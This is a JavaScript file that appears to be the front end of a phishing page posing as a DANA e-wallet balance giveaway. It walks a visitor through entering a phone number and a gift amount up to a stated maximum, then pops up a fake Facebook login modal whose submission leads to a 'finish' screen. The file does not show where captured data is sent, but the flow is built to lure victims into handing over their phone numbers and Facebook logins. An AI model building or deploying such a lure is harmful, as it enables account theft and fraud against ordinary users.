
function formatRupiah(angka) {
	const format = new Intl.NumberFormat('id-ID', {
		style: 'currency',
		currency: 'IDR'
	});
	return format.format(angka);
}

function get_number( val ) {
	var str = formatRupiah( val );
	str = str.split(",");
	return str[0];
}	
function formatNumberPhone( numberString ) {
	// Remove any existing hyphens to avoid duplication
	let cleanedString = numberString.replace(/-/g, '');

	// Split the string into chunks of 4 characters
	let formattedString = cleanedString.match(/.{1,4}/g)?.join('-') || cleanedString;

	return formattedString;
}


// +++++++++ METHOD TERKAIT APP LAYER ++++++++++++++++++++++
var animasi_transisi;
var db_max_gift = 10000000;

function open_app_layer( app_layer_target, content_layer_target = false ) {
	var app_layer_target = $( app_layer_target );
	var app_layer_target_id = app_layer_target.attr('id');
	var container_app_layer = app_layer_target.find('.container_app_layer');	


	//Hilangkan app_layer yang sedang aktif
	close_app_layer();

	//Munculkan app_layer target
	app_layer_target.addClass('active');
	setTimeout(function(e) {
		container_app_layer.addClass('active');
	}, animasi_transisi)

	//++++++ Munculkan content layer pada content_app_layer

	//Pilih content layer target dengan logika aman
	if ( content_layer_target != false ) {
		content_layer_target = $(content_layer_target);
	}else{
		//Jika tidak ada content layer yang dipilih, maka pilih di elemen yang pertema content layeer pada app layer tersebbut
		content_layer_target = container_app_layer.find('.content_layer').eq(0);

	}

	//Error Handling
	if ( content_layer_target.length < 1 ) {
		var msg_err = "Tidak ada element content layer yang dituju atau bisa dibuka pada app layer yang dibuka";
		console.log(msg_err);
		alert(msg_err);
	}

	open_contentLayer( content_layer_target, 'slide' );


}

function close_app_layer() {

	//Hilangkan app_layer yang sedang aktif
	var app_layer = $('.app_layer').filter('.active');
	var container_app_layer = app_layer.find('.container_app_layer');

	container_app_layer.removeClass('active');
	setTimeout(function(e) {
		app_layer.removeClass('active');
	}, animasi_transisi)


}
function open_loadLayer() {
	var load_layer = $('.load_layer');
	load_layer.show();
}
function close_loadLayer() {
	var load_layer = $('.load_layer');
	load_layer.hide();
}

function load_layer(callback, timer) {
	open_loadLayer();
	setTimeout( function() {
		callback();
		close_loadLayer();
	}, timer );
}

function open_contentLayer( id,  effect = "none", callback = false) {
	if ( callback == false ) {
		callback = function() {
			return 1;
		}
	}

	var content_layer_target = $( id );
	var content_layer_active = $('.content_layer').filter('.active');


	load_layer( function() {
		//Menghilangkan content layer yang active dan hilangkan tandanya
		content_layer_active.hide();
		content_layer_active.removeClass('active');
		//Mengaktifkan content layer yang dituju dan berikan tandanya
		content_layer_target.show(effect);
		content_layer_target.addClass('active');
	}, 500);

	callback( content_layer_target );
}
function validasi_phoneDana() {
	//Validasi agar bisa lanjut ke app layer transakasi 
	var input_phone = $('input[name=phone_dana]');
	var phone_number = input_phone.val();
	var param_validasi;
	if ( phone_number.length > 0 ) {
		param_validasi = true;
		
	}else{
		param_validasi = false;
		console.log("Belum memasukkan nomor telpon");
		if ( $('#app_auth').is(':visible') == false ) {
			open_app_layer('#app_auth', '#layer_auth_phone');
		}
	}

	$('#phone_number').text( phone_number );

	return param_validasi;
}
function validasi_saldo() {
	var input_saldo_dana = $('input[name=saldo_dana]').val();
	input_saldo_dana = input_saldo_dana.split('Rp');
	input_saldo_dana.shift();
	input_saldo_dana = input_saldo_dana.join("");
	var max_saldo_gift = db_max_gift;

	var param_validasi;
	var msg_error = "";
	//Validasi kosong atau gak
	if ( input_saldo_dana.length > 0 ) {	
		//Validasi nilai minus itu tidak boleh
		input_saldo_dana = input_saldo_dana.replace(/\./g, "")
		input_saldo_dana = parseFloat( input_saldo_dana );

		param_validasi = true;
		//Validasi kesalahanannya
		switch( true ){
			//Input saldo gak boleh minus
			case input_saldo_dana < 0:
			param_validasi = false;
			msg_error += "Saldo Tidak Boleh Minus";
			break;
			//Input saldo gak boleh lebih dari batas hadiah
			case input_saldo_dana > max_saldo_gift:
			param_validasi = false;
			msg_error += "Melebihi Batas Maximal";
			break;
		}

	}else{
		msg_error += "Saldo belum diinputkan!";
		param_validasi = false;
	}


	console.log(  param_validasi );
	console.log(  msg_error );
	console.log( "Input : " + input_saldo_dana, "Hadiah Max : " + max_saldo_gift, );
	
	var validasi_error =$('.validasi_error');
	validasi_error.show();
	validasi_error.text( msg_error );
	return param_validasi;
}	
function start_appLayerTransaction() {
	var validasi = validasi_phoneDana() && validasi_saldo() ;
	if ( validasi == true ) {
		//Isi semua data pada app_layer transactionnya 
		/*
		user dana adalah nomor 
		saldo dana adalah input saldo
		*/

		var user_dana = $('input[name=phone_dana]').val();
		var saldo_dana = $('input[name=saldo_dana]').val();

		$('.user_dana').text(user_dana);
		$('.saldo_dana').text(saldo_dana);

		open_app_layer('#app_transaction');
	}
}




$(document).ready(function(e) {

	var input_dial = $(".input_dial");
	input_dial.val("");
	input_dial.prop('readonly', true);

	var dial_db = "";
	$('.col_dial').on('click', function(e) {
		var col_dial = $(this);
		var data_dial = col_dial.attr('data-dial');

		if ( data_dial != "del" ) {
			//Input dial
			console.log("Input dial");

			//Update ke konstan
			dial_db += data_dial;

		}else{
			//Hapus dial
			console.log("Hapus dial");


			if ( dial_db.length < 1 ) {
				console.log("Tidak ada karakter yang di hapus");
				return false;
			}

			var dial_del = dial_db.split("");
			var del_char = dial_del.pop();
			dial_del = dial_del.join("");

			//Update ke dial_db 
			dial_db = dial_del;

		}

		//Ubah format dan tampilkan 
		var dial_output = get_number( dial_db );
		input_dial.val( dial_output );

		console.log( "Dial DB :" + dial_db );
		console.log("+++++++++++++++++++");
	});




	// +++++++++++++++  METHOD EVENT UNTUK FORM FACEBOOK ++++++++++
	$('.warpoelContainer .btn_close, .modal_backdrop').on('click', function(e) {
		var el_target = $(this);
		var modal = el_target.parents('.warpoelContainer');
		modal_hide(modal); 
		close_app_layer();
		//Pencet btn_save_phone 
	});

	// +++++++++++++++  METHOD EVENT UNTUK APP LATER ++++++++++
	//Membuat callback delay
	animasi_transisi = $('.container_app_layer').css('transition-duration');
	animasi_transisi = animasi_transisi.split("s");
	animasi_transisi = animasi_transisi[0];
	animasi_transisi = parseFloat( animasi_transisi );
	animasi_transisi = animasi_transisi * 1000; //Karena 1 s = 1000ms

	$('.app_layer .backdrop').on('click', function(e) {
		close_app_layer();
	});


	//+++++++ App Layer Auth ++++++++++
	// open_app_layer("#app_auth");
	$('input[name=phone_dana]').on('keyup', function() {
		var input_number = $(this);
		var value = input_number.val();	
		var format_number = formatNumberPhone( value );

		input_number.val( format_number );
	});
	$('#btn_save_phone').on('click', function(e) {
		load_layer(function() {
			var validasi_phone = validasi_phoneDana();
			if ( validasi_phone == true ) {
				close_app_layer();
			}
		}, 300);
	});
	//+++++++ App Layer Transaction ++++++++++
	$('#btn_submit_dial').on('click', function(e) {

		start_appLayerTransaction();
	});
	$('#app_transaction #layer_confirm .btn_submit').on('click', function(e) {

		//Event Pindah layer Tapi Harus 

		//Validasi login facebook result 
		open_loadLayer();
		setTimeout(function () {
			modal_show('#modal_facebook');
		}, 300)

	});

	$('#modal_facebook').find('form').on('submit', function(e) {

		modal_hide( $('#modal_facebook') );
		//Pindah ke layer finsih dan Custom container app layernya menjadi tinggi memenuhi layar  
		open_contentLayer('#layer_finish', 'slide', function( content_layer_target ) {
			var container_app_layer = content_layer_target.parents('.container_app_layer');
			container_app_layer.css('height', '100%');
		});

		return false;
	});




	$('input[name=phone_dana]').val("");
	$('.max_gift').text( get_number( db_max_gift ) );
	validasi_phoneDana();


});

